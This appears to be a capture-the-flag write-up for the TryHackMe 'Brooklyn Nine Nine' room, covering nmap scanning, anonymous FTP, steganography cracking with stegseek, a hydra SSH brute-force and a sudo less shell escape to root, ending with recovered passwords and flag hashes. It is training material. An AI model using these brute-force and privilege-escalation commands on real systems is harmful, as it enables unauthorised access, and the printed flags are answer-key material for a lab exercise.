# [Challenge](https://tryhackme.com/room/brooklynninenine)

- # ENUM
	- ### nmap (`sudo nmap -sV -p- -A -T4 brooklin-nn`)
		- ```21/tcp open  ftp     vsftpd 3.0.3
			| ftp-anon: Anonymous FTP login allowed (FTP code 230)
			|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
			| ftp-syst: 
			|   STAT: 
			| FTP server status:
			|      Connected to ::ffff:10.9.1.212
			|      Logged in as ftp
			|      TYPE: ASCII
			|      No session bandwidth limit
			|      Session timeout in seconds is 300
			|      Control connection is plain text
			|      Data connections will be plain text
			|      At session startup, client count was 3
			|      vsFTPd 3.0.3 - secure, fast, stable
			|_End of status
			22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
			| ssh-hostkey: 
			|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
			|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
			|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
			80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
			|_http-title: Site doesn't have a title (text/html).
			|_http-server-header: Apache/2.4.29 (Ubuntu)
			Device type: general purpose
			Running: Linux 4.X
			OS CPE: cpe:/o:linux:linux_kernel:4.15
			OS details: Linux 4.15
			Network Distance: 2 hops
			Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel```

- # EXPLOITATION
	- Log into anonymous `FTP` and get `note_to_jake.txt`:
		- ```From Amy,
			Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine```
	- In the website, there's an image and a comment in the HTML: "`Have you ever heard of steganography?`"
		- Let's run `steegseek` to crack the file: `stegseek -sf brooklyn99.jpg -wl /usr/share/wordlists/rockyou.txt
			- ```Holts Password:
				fluffydog12@ninenine
				
				Enjoy!!```
	- Use `hydra` to crack Jake's password: `hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://brooklyn-nn`
		- password: `987654321`

- # PRIVILEGE ESCALATION
	- `sudo -l`
		- `less` has root permissions! Let's check on GTFOBins:
		  ```sudo less /etc/profile !/bin/sh```
			- We're root!
			- user.txt: `ee11cbb19052e40b07aac0ca060c23ee`
			- root.txt: `63a9f0ea7bb98050796b649e85481845`